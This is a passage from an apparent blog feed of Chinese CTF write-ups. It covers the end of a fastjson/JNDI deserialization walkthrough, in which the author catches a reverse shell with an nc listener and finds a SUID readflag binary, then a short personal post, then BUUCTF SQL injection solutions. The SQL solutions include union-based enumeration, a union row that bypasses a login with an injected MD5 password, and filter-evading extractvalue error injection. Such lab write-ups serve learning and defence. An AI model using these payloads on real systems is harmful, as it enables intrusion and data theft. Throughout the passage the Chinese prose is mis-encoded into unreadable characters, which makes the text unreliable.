å¤§æ¦‚æ˜¯æŸ¥æ‰¾æŒ‡å®šç›®æ ‡</p><p><img src="/img/fastjsonAndJNDI/XjEJbxvo3oMoNcxZJF1cZPUMn7g.png"></p><p>åˆ° <code>writeRequest()</code> å¤„ä¼šä» ldap æœåŠ¡ç«¯è·å–æ•°æ®æµï¼ŒæœåŠ¡ç«¯å¯ä»¥çœ‹åˆ°å“åº”è¾“å‡ºï¼Œ360 ä¹Ÿä¼šåœ¨è¿™ä¸ªæ—¶å€™å‘Šè­¦ã€‚åç»­å¤šæ¬¡æ­¥è¿‡ï¼Œä¸‰æ¬¡ return</p><p><img src="/img/fastjsonAndJNDI/X4aybhcIaogljYxabcgcozIQnfh.png"></p><p>å›åˆ° <code>c_lookup()</code>ï¼Œæ¥ä¸‹æ¥åˆ¤æ–­ <code>JAVA_ATTRIBUTES[2]</code> å³ <code>javaClassName</code> æ˜¯å¦ä¸ºç©º</p><p><img src="/img/fastjsonAndJNDI/XNGqbLHmJopYLIxDPulcXuEQnDh.png"></p><p>å½“ <code>javaClassName</code> å­˜åœ¨æ—¶å¯¹ç›®æ ‡è¿›è¡Œè§£ç ï¼Œæ­¥å…¥ <code>Obj.decodeObject()</code></p><p><img src="/img/fastjsonAndJNDI/Is2FbGZhQoAcujxkEkEciIi1nJh.png"></p><p><code>getCodebases()</code> è·å– <code>javaCodebase</code> å±æ€§ï¼Œæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨ï¼Œä¸ºç©ºï¼Œç»§ç»­æ­¥è¿‡</p><p><img src="/img/fastjsonAndJNDI/S6ohbiNUToceZPxY5IBcJ79gnch.png"></p><p>å½“å±æ€§ javaSerializedData ä¸ä¸ºç©ºæ—¶ï¼Œ<code>getURLClassLoader()</code> æ ¹æ® <code>javaCodebase</code> å±æ€§è·å–åŠ è½½å™¨ï¼ˆç©ºï¼Œé€‰æ‹©é»˜è®¤åŠ è½½å™¨ï¼‰è¿”å› <code>deserializeObject()</code> å»ååºåˆ—åŒ–ï¼Œæ­¥å…¥ <code>deserializeObject()</code></p><p><img src="/img/fastjsonAndJNDI/EBGtbem23owygvxk5plcMFVrnBb.png"></p><p>åœ¨è¿™é‡Œè¿›è¡ŒåŸç”Ÿååºåˆ—åŒ–ï¼Œæ‰§è¡Œå‘½ä»¤</p><p><img src="/img/fastjsonAndJNDI/Lh91bjWJwo4HmmxbryScFBIvns3.png"></p><p>æ¥ä¸‹æ¥æ­£å¼åšé¢˜ï¼Œè¿˜æ˜¯æŠŠæœ¬åœ°æœåŠ¡ç«¯ç«¯å£æ˜ å°„åˆ°äº‘æœåŠ¡å™¨ï¼Œå‘é¶æœºå‘åŒ…</p><p><img src="/img/fastjsonAndJNDI/BWurbMSU2o1Upgxyhnbc0UBknYe.png"></p><p>æœ¬åœ°æœåŠ¡ç«¯å¯ä»¥çœ‹åˆ°é¶æœºçš„è¿œç¨‹è¯·æ±‚æŠµè¾¾äº†æœ¬åœ°</p><p><img src="/img/fastjsonAndJNDI/EP48bd2sEoCHStxWFkmcBSapnV7.png"></p><p>äº‘æœåŠ¡å™¨ä¸Šä½¿ç”¨ <code>nc -lvvp 12345</code> ç›‘å¬ 12345 ç«¯å£å¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼ŒæˆåŠŸæ¥æ”¶åˆ°åå¼¹ shell</p><p><img src="/img/fastjsonAndJNDI/H54wbEctgoIW5wxSujTcJZULnKh.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬æƒ…å†µï¼Œå½“å‰æ™®é€šç”¨æˆ·æƒé™ï¼Œæ ¹ç›®å½•å‘ç° flag</p><p><img src="/img/fastjsonAndJNDI/Ge9ibYoTWoQSpLxxhBWcZpJ5nTb.png"></p><p>flag ä¸º root ç”¨æˆ·æ‰€æœ‰ï¼Œæ— æ³• <code>cat flag</code>ï¼Œä½¿ç”¨å‘½ä»¤ <code>find / -perm -4000 -type f 2&gt;/dev/null</code> æŸ¥æ‰¾ SUID æ–‡ä»¶ï¼Œå‘ç° <code>/readflag</code>ï¼ˆOh No çœ¼çäº†â€¦ï¼‰ï¼Œ<code>/readflag</code> ç›´æ¥è§£å†³ã€‚</p><p><img src="/img/fastjsonAndJNDI/SWPXbwUk8oTTEAxfM8bcTZPon2f.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>JNDI å¾ˆå¤šå†…å®¹åœ¨æµç¨‹åˆ†ææ—¶æ²¡æœ‰æˆåŠŸè°ƒè¯•è¿›å»ï¼Œç„¶åå°±æš‚æ—¶å…ˆä¸ç®¡äº†ï¼Œå¯¹äº JNDI è¿˜æœ‰ Jackson çš„å­¦ä¹ è¿˜æ¯”è¾ƒæµ…ï¼Œåç»­æœ‰ç©ºçš„æ—¶å€™å†ä¸“é—¨ç ”ç©¶ä¸€ä¸‹å®ƒçš„åŸç†å’Œå„ç§åˆ©ç”¨é“¾ã€ç»•è¿‡æ–¹æ³•ï¼Œè¿˜éœ€è¦æ‰¾æœºä¼šå­¦ä¹ ä¸€ä¸‹ä¸€èˆ¬å¦‚ä½•å¯»æ‰¾åˆ©ç”¨é“¾</p><p>å¦å¤–ï¼Œåˆå­¦æ—¶å·æ‡’ä¸å¯å–ï¼Œæœ¬ç¯‡å·²ç»å› æ­¤é€ æˆä¸¤æ¬¡é”™è¯¯äº†</p><p>å…¶å®è¿™ä¸€ç³»åˆ—é‡Œé¢å¯å­¦çš„å¯å†™çš„è¿˜å¾ˆå¤šï¼Œä½†æ˜¯å…¨å†™ä¸€èµ·å¤ªä¹±äº†ï¼Œæœ‰ç©ºçš„æ—¶é—´å†æ•´ç†æ€»ç»“ä¸€ä¸‹ï¼ˆå¸Œæœ›æœ‰ç½¢ï¼‰ã€‚</p><p>è¿™ä¸€è¶Ÿå­¦ä¹ ä¸‹æ¥è¿˜æ”¶è·ã€å®è·µäº†å‡ ä¸ªå°æŠ€å·§ï¼šå¦‚ä½•åˆ†æ jar åŒ…ï¼Œå¦‚ä½•åˆ†æ jar åŒ…ä½¿ç”¨çš„ jdk ç‰ˆæœ¬ï¼Œå¦‚ä½•å¿«é€Ÿèµ·ä¸€ä¸ª http æœåŠ¡ï¼Œä»¥åŠå¯¹äº spring é¡¹ç›®å¦‚ä½•è·å–å¯èƒ½æœ‰ç”¨çš„æŠ¥é”™ç»†èŠ‚ï¼ˆå°†å‘åŒ…çš„ Accept å­—æ®µè®¾ä¸º*&#x2F;*ï¼Œspring é¡¹ç›®çš„è¯¦ç»†æŠ¥é”™ä¿¡æ¯ä¸€èˆ¬ä¼šä»¥ json æ ¼å¼è¿”å›ï¼Œå½“ç„¶è¿™é‡Œçš„é¢˜ç”¨ä¸åˆ°ï¼‰</p><h1 id="ä¸»è¦å‚è€ƒèµ„æ–™æ±‡æ€»"><a href="#ä¸»è¦å‚è€ƒèµ„æ–™æ±‡æ€»" class="headerlink" title="ä¸»è¦å‚è€ƒèµ„æ–™æ±‡æ€»"></a>ä¸»è¦å‚è€ƒèµ„æ–™æ±‡æ€»</h1><ul><li>B ç«™è§†é¢‘ï¼Œæ€»ç»“äº† checkAutoType()æ•´ä½“çš„åˆ¤æ–­é€»è¾‘ï¼Œç”»äº†æµç¨‹å›¾æ–¹ä¾¿ç†è§£ï¼Œå¤ç°çš„æ“ä½œå±•ç¤ºã€è°ƒç”¨è¿‡ç¨‹åˆ†æè·Ÿç€è§†é¢‘çœ‹ä¼šæ›´å¥½ç†è§£ä¸€äº› <a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885">https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from&#x3D;333.1387.homepage.video_card.click&amp;vd_source&#x3D;ae44e9df2e6bb265e83888153930e885</a></li><li>è¿™ç¯‡ fastjson å„ä¸ªç‰ˆæœ¬çš„æ¼æ´åˆ†æéƒ½æ¯”è¾ƒå…¨é¢è¯¦ç»†ï¼Œfastjson ååºåˆ—åŒ–æ¼æ´æœ‰äº›ä¸œè¥¿å¿˜è®°äº†å¯ä»¥ç»“åˆè¿™ç¯‡å’Œä¸‹é¢ä¸€ç¯‡æŸ¥çœ‹ <a href="https://su18.org/post/fastjson/">https://su18.org/post/fastjson/</a></li><li>è¿™ç¯‡ fastjson å„ä¸ªç‰ˆæœ¬çš„æ¼æ´æ€»ç»“å¾—ä¹Ÿæ¯”è¾ƒå…¨é¢è¯¦ç»†ï¼Œå¯ä»¥ç»“åˆä¸Šé¢ä¸€ç¯‡ä¸€èµ·æŸ¥çœ‹ <a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></li><li>è¿™ç¯‡æ˜¯ JNDI çš„æ–‡ç« ï¼Œä¸»è¦æ˜¯ JNDI çš„æ¦‚å¿µå’Œé€šè¿‡ rmiã€ldap çš„åˆ©ç”¨é€”å¾„ã€é«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œç›¸è¾ƒä¸‹ä¸€ç¯‡ä¼šæ›´æ¡ä¾‹æ¸…æ™°ç®€æ´ä¸€äº› <a href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a></li><li>è¿™ç¯‡ä¹Ÿæ˜¯ JNDIï¼Œä¸»è¦æ˜¯ JNDI çš„å‰ç½®çŸ¥è¯†å’Œé€šè¿‡ rmiã€ldap çš„åˆ©ç”¨ç¤ºä¾‹ï¼Œå’Œä¸Šä¸€ç¯‡ç»“åˆèµ·æ¥çœ‹ <a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></li><li>fastjson ååºåˆ—åŒ–ç›¸å…³ä¸å‡ºç½‘åˆ©ç”¨çš„ CTF ä¾‹é¢˜ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œæ‹“å±•å­¦ä¹ ä¸€ä¸‹ <a href="https://www.anquanke.com/post/id/283079">https://www.anquanke.com/post/id/283079</a></li><li>SnakeYaml çš„ååºåˆ—åŒ–ï¼Œæ‹“å±•ä¸€ä¸‹ <a href="https://tttang.com/archive/1815/#toc_spi">https://tttang.com/archive/1815/#toc_spi</a></li><li>é«˜ç‰ˆæœ¬ Tomcat çš„ JNDI åˆ©ç”¨æ‹“å±•ä¸€ä¸‹ <a href="https://xz.aliyun.com/news/16156">https://xz.aliyun.com/news/16156</a></li><li>fastjson å„ç§åˆ©ç”¨é“¾æ€»ç»“ï¼Œæ¯”è¾ƒæ¸…æ™° <a href="http://www.bmth666.cn/2022/04/11/Fastjson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/04/11/Fastjson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html</a></li><li>JNDI æ€»ç»“ï¼Œç›¸å¯¹å…¨é¢è¯¦ç»† <a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></li><li>é«˜ç‰ˆæœ¬ JNDI æ³¨å…¥æ€è·¯æ€»ç»“ï¼Œç›®å½•å¾ˆæ¸…æ™° <a href="https://www.cnblogs.com/R0ser1/p/17105579.html">https://www.cnblogs.com/R0ser1/p/17105579.html</a></li><li>ç®€æ´çš„ Jackson è¿™æ¡åˆ©ç”¨é“¾çš„ payload å’Œä¸€é“é¢˜çš„è§£æï¼Œè¿˜æœ‰å…¶ä»– java ç›¸å…³çš„æ€»ç»“ <a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson</a></li><li>Jackson åŸç”Ÿååºåˆ—åŒ–çš„åˆ†æ <a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>ååºåˆ—åŒ–</tag>
      
      <tag>java</tag>
      
      <tag>fastjson</tag>
      
      <tag>JNDI</tag>
      
      <tag>ç»•è¿‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oh Yeah ~</title>
    <link href="/2025/03/23/OhYeah/"/>
    <url>/2025/03/23/OhYeah/</url>
    
    <content type="html"><![CDATA[<h1 id="åŠ å…¥Vidar-Teamå•¦ï¼"><a href="#åŠ å…¥Vidar-Teamå•¦ï¼" class="headerlink" title="åŠ å…¥Vidar-Teamå•¦ï¼"></a>åŠ å…¥Vidar-Teamå•¦ï¼</h1><p>ç»è¿‡æˆ‘çš„åŠªåŠ›å¥‹æ–—å’Œåä¼šå¤§ä½¬çš„ææºæˆ‘ç»ˆäºåŠ å…¥äº†Vidar-Teamï¼</p><p><img src="/img/OhYeah/1.jpg" alt="é‚€è¯·å‡½ï¼"></p><p><img src="/img/OhYeah/2.jpg" alt="å˜¿å˜¿ï¼Œåä¼šå‘¨è¾¹"></p><p>å®Œæˆä¸€ä¸ªé‡è¦ç›®æ ‡ï¼Œæ—¥åå†æ¥å†åŠ±ï¼ï¼ï¼</p><blockquote><p><em><p style="text-align:center"><span  style="font-size:1.0em;">Keep going !</span></p></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>I&#39;m...</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF SQL åˆ·é¢˜</title>
    <link href="/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/"/>
    <url>/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-SQL-åˆ·é¢˜"><a href="#BUUCTF-SQL-åˆ·é¢˜" class="headerlink" title="BUUCTF SQL åˆ·é¢˜"></a>BUUCTF SQL åˆ·é¢˜</h1><h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>åˆ†ææµé‡åŒ…ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å¸ƒå°”å‹ SQL ç›²æ³¨çš„è¿‡ç¨‹ï¼Œæ³¨å…¥è¯­å¥ä¸å†å…·ä½“åˆ†æï¼Œè¿™é‡Œå¤ä¹ ä¸€ä¸‹ wireshark çš„ä½¿ç”¨</p><p>æ‰¾åˆ°æ­£ç¡®æ—¶çš„å“åº”åŒ…</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/OusVbMRC4o51aWxF61IcewiPnve.png"></p><p>æ ¹æ®å†…å®¹é•¿åº¦ç­›é€‰</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/FrLJbUgCso9fGvxBcohcsnazn8g.png"></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/JGMbbFkWkopOCgxmVEwcUQB2nVf.png"></p><p>å“åº”åŒ…ä¸­å¯ä»¥çœ‹åˆ°è¯·æ±‚çš„ url</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/J6zFbtwv7oEN8WxiaR0ce5tZnub.png"></p><p>å¯¼å‡ºæ‰€æœ‰ç¬¦åˆè¦æ±‚çš„å“åº”åŒ…å†…å®¹</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/NTDAbbVUbohPwuxFl4Vc8FEmnLe.png"></p><p>å†™ä¸€ä¸ªè„šæœ¬æ­£åˆ™åŒ¹é…æå–ä¿¡æ¯å¹¶è¾“å‡º flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sql.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>flag = [<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> f.readlines():<br>    num = re.search(<span class="hljs-string">r&quot;limit%200,1\)\),%20(\d+),%201\)\)&quot;</span>,l)<br>    part = re.search(<span class="hljs-string">r&quot;,%201\)\)&gt;(\d+)]&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">and</span> part:<br>        flag[<span class="hljs-built_in">int</span>(num.group(<span class="hljs-number">1</span>))] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(part.group(<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>)<br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(f,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="BUU-SQL-COURSE"><a href="#BUU-SQL-COURSE" class="headerlink" title="BUU SQL COURSE"></a>BUU SQL COURSE</h1><p>ç™»å½•æœªèƒ½æ³¨å…¥æˆåŠŸï¼Œæµè§ˆå™¨è§‚å¯Ÿç½‘ç»œæ¨¡å—å‘ç°æ–°é—»ç‚¹å‡»æ—¶å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œæ‰€ä»¥å¤åˆ¶ url å¼€å§‹å°è¯•</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/I4WhbD5rpoJ0qNx7zlJceNGhnme.png"></p><p><code>?id=1 and 1=1</code> æ—¶ä»æ˜¯ç›¸åŒå›æ˜¾</p><p><code>?id=1 and 1=2</code> æ—¶æ— å›æ˜¾ï¼Œè¯´æ˜ä¸ºæ•°å­—å‹</p><p><code>?id=1 order by 2</code> æœ‰æ­£å¸¸å›æ˜¾ï¼Œ<code>?id=1 order by 3</code> æ— ï¼Œè¯´æ˜ä¸º 2 åˆ—</p><p><code>?id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code> å³å¯å¾—åˆ°æ•°æ®åº“åã€è¡¨å</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/IXUnb4AFSoT7jhxE2Wucs5UQnJe.png"></p><p>åç»­ä¾æ¬¡è·å–åˆ—åã€å†…å®¹å³å¯</p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h1><p>å°è¯•åˆ¤æ–­é—­åˆç±»å‹ï¼Œç»“å°¾ä½¿ç”¨æ³¨é‡Š</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/WUQZbgFmrombgMxEdN2cbOhHnof.png"></p><p>åœ¨å¯†ç  123 å¤„æŠ¥é”™ï¼Œè¯´æ˜å¯†ç çš„é—­åˆæ–¹å¼ä¸ºåŒå¼•å·ä¸”æ³¨é‡Šæœªç”Ÿæ•ˆï¼Œå°è¯• <code>1&#39; and 1=1 -- -</code></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/QAJfbgSDFoVJ42x3kbucknkVnTb.png"></p><p>æœªå‡ºç°å¦‚ä¸ŠæŠ¥é”™ï¼Œæ³¨é‡ŠæˆåŠŸï¼Œæœªå‡ºç°å…¶ä»–æŠ¥é”™ï¼Œé—­åˆæ–¹å¼æ­£ç¡®ï¼Œè¾“å…¥ <code>1&#39; order by 5 -- -</code> é€ä¸€å°è¯•</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/FNAebYobGomIfrxSZdgcFa6Tnuf.png"></p><p><code>1&#39; order by 4 -- -</code> æ—¶æŠ¥é”™ï¼Œ<code>1&#39; order by 3 -- -</code> æœªæŠ¥é”™ï¼Œè¯´æ˜ 3 åˆ—</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/EzxjbooRXoIJgJxb4Ldcs7hgnb1.png"></p><p>è¾“å…¥ <code>1&#39; union select 1,2,3 -- -</code> åˆ¤æ–­æ˜¾ç¤ºä½ç½®ï¼Œç›´æ¥ç»“æŸã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/JgCrb5IWGoabbixlF4LcIA3Fn5m.png"></p><p><strong>å…¶å®ç›´æ¥</strong> <code>1&#39; or 1=1 #</code> <strong>å®Œäº‹â€¦â€¦</strong></p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>è¾“å…¥ <code>1&#39; and 1=1 -- -</code>ï¼Œæ˜¾ç¤º do not hack me å‘ç°æœ‰è¿‡æ»¤ï¼Œå¤šè¯•å‡ ä¸ªå°±å‘ç° andã€orã€&#x3D;å‡æœ‰è¿‡æ»¤ï¼Œå°è¯•å¤§å°å†™æˆåŠŸç»•è¿‡ã€‚</p><p>è¾“å…¥ <code>1&#39; Order By 3 -- -</code> æ— æŠ¥é”™ï¼Œ<code>1&#39; Order By 4 -- -</code> æŠ¥é”™ï¼Œè¯´æ˜å…±ä¸‰åˆ—</p><p>è¾“å…¥ <code>1&#39; union select 1,2,3 -- -</code> ä»ä¸º wrong userï¼Œæ²¡å‘ç°å›æ˜¾ä½ç½®</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/AFKxbgFwNo9rcdxYw7kcvwynnAf.png"></p><p>ä½†æ˜¯å‘ç°æ³¨é‡Šå¦‚ä¸‹ï¼ˆåŸæœ¬å°±æœ‰ä¹‹å‰æ²¡çœ‹åˆ°ï¼‰ï¼Œbase32+base64 è§£å¯†å¯å¾—æ˜æ–‡</p><p><code>select * from user where username = &#39;$name&#39;</code></p><p>é‚£ä¹ˆé€»è¾‘åº”è¯¥å°±æ˜¯å…ˆæ ¹æ®ç”¨æˆ·åæŸ¥æ‰¾ï¼Œç„¶åå†æ ¡éªŒå¯†ç ã€‚</p><p>ç”¨æˆ·åç›´æ¥è¾“å…¥ adminï¼Œå­˜åœ¨è¯¥ç”¨æˆ·ï¼Œè¿”å› wrong pass</p><p>å·²çŸ¥ä¸€ä¸ªç”¨æˆ·ååç”¨ union select å»æ¢æµ‹ä¸€ä¸‹ç”¨æˆ·åæ‰€åœ¨åˆ—ï¼Œè¾“å…¥ <code>1&#39; union select &#39;admin&#39;,2,3 -- -</code> è¿”å› wrong userï¼Œè¾“å…¥ <code>1&#39; union select 1,&#39;admin&#39;,3 -- -</code> è¿”å› wrong passï¼Œè¯´æ˜ç”¨æˆ·åä½äºç¬¬äºŒåˆ—ï¼Œå¯ä»¥æ¨æµ‹å¯†ç å³ç¬¬ä¸‰åˆ—ã€‚</p><p>ä½†æ˜¯åé¢å°±ä¸çŸ¥é“æ€ä¹ˆæäº†ï¼Œåªèƒ½å»çœ‹æºç ï¼Œè¾“å…¥çš„å¯†ç  md5 åŠ å¯†åè¦ä¸æ•°æ®åº“ç¬¬ä¸‰åˆ—æ•°æ®ä¸€è‡´æ‰èƒ½è·å¾— flagã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/QZ0AbwarKoF7Plx2DRxcfaYknHh.png"></p><p>ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç° union è”åˆæŸ¥è¯¢æ—¶å¦‚æœæŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨ï¼Œå°±ä¼šæ„å»ºä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œå¯èƒ½è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ <code>1&#39; union select 1,2,3 -- -</code> å¯ä»¥æ¢æµ‹å›æ˜¾ä½ç½®ï¼Œ1<del>3 åœ¨è¡¨å†…åŸæœ¬ä¸å­˜åœ¨ï¼Œunion æŸ¥è¯¢åå…ˆæ„é€ äº†è™šæ‹Ÿçš„ 1</del>3 çš„æ•°æ®ï¼Œç„¶åå†è¯»å–è¿”å›åˆ°æœ‰å›æ˜¾çš„ä½ç½®ã€‚</p><p>ç”±äºæ˜¯å…ˆæŸ¥è¯¢ç”¨æˆ·åå†åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œæ‰€ä»¥æœ¬é¢˜å¯ä»¥åˆ©ç”¨ union è”åˆæŸ¥è¯¢åœ¨ç”¨æˆ·åå¤„æ³¨å…¥ï¼Œå‘å¯†ç åˆ—å†™å…¥ä¸€ä¸ª md5 å€¼ï¼Œç„¶ååœ¨å¯†ç å¤„è¾“å…¥ md5 å¯¹åº”çš„æ˜æ–‡ï¼Œé‚£ä¹ˆåœ¨æŸ¥è¯¢å®Œç”¨æˆ·ååè™šæ‹Ÿæ•°æ®æ„é€ å®Œæˆï¼Œåˆ¤æ–­å¯†ç æ—¶å°±å°†å¯†ç æ è¾“å…¥çš„å†…å®¹ md5 åŠ å¯†åä¸è™šæ‹Ÿæ•°æ®çš„å¯†ç åˆ—å†…å®¹æ¯”è¾ƒï¼Œä¹Ÿå°±ç»•è¿‡äº†åŸæœ¬çš„å¯†ç ã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">ä¾‹å¦‚ï¼š                                  ï¼ˆ<span class="hljs-number">123</span> md5åçš„ç»“æœï¼‰<br>ç”¨æˆ·ï¼š<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&#x27; <span class="hljs-comment">-- -</span><br>å¯†ç ï¼š<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1><p>é€ä¸ªå°è¯•å‘ç° andã€&#x3D;ã€&gt;ã€&lt;ã€ç©ºæ ¼ã€union å‡è¢«è¿‡æ»¤ï¼ŒåŒå†™åŠå¤§å°å†™å‡æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯å­˜åœ¨æŠ¥é”™ä¿¡æ¯ï¼Œè€ƒè™‘æŠ¥é”™æ³¨å…¥ã€‚</p><p>è¾“å…¥ <code>1&#39;&quot;</code> æŠ¥é”™ï¼Œ<code>use near &#39;&quot;&#39; and password=&#39;123&#39;&#39; at line 1</code>ï¼Œæ‰€ä»¥å•å¼•å·é—­åˆ</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/X4Tfb1kbboP7d7xO2FZcfjDrnLb.png"></p><p>è¾“å…¥ <code>1&#39;</code> æŠ¥é”™ï¼Œè¾“å…¥ <code>1&#39;#</code> ä¸æŠ¥é”™ï¼Œ<code>#</code> æˆåŠŸæ³¨é‡Š</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/AJEFbUNbXoXesOx2ykQcF5q9npe.png"></p><p>å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤ï¼Œæ‹¬å·æ­£å¸¸ï¼Œæ‰€ä»¥å¯ä»¥å¥—æ‹¬å·ä»£æ›¿ç©ºæ ¼ã€‚<code>extractvalue()</code> å‡½æ•°å»è§¦å‘æŠ¥é”™ï¼Œ<code>concat()</code> æ‹¼æ¥ä¸€ä¸‹å†…å®¹ã€‚è¾“å…¥ <code>1&#39;or(extractvalue(1,concat(0x7e,database())))#</code>ï¼ŒæˆåŠŸå¾—åˆ°æ•°æ®åº“åã€‚</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/UwYLbR2kooz1FJx4PMlcDWb8nIh.png"></p><p>è¿™é‡Œæ³¨æ„æ•´ä¸ª select è¯­å¥å¤–é¢ä¹Ÿè¦å¥—ä¸€å±‚æ‹¬å·ï¼Œç”¨ <code>like</code> ä»£æ›¿ <code>=</code> ç»§ç»­è¾“å…¥ 